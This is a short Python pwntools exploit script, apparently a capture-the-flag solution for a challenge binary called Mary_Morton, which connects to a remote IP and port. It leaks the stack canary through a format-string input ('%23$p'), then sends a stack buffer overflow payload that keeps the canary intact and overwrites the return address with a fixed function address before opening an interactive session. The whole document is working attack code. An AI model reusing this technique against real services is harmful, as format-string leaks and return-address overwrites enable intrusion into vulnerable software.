from pwn import *
#context.log_level = 'debug'

r = remote('111.198.29.45', 48682)
#r = process('./Mary_Morton')
r.recvuntil("3. Exit the battle \n")
r.sendline("2")

r.sendline("%23$p")
canary = int(r.recvuntil("1.")[:-2], 16)
print hex(canary)

r.recvuntil("3. Exit the battle \n")
r.sendline("1")

payload = 'A' * (0x90-8) + p64(canary) + 'aaaaaaaa' + p64(0x4008DA)
r.sendline(payload)

r.interactive()



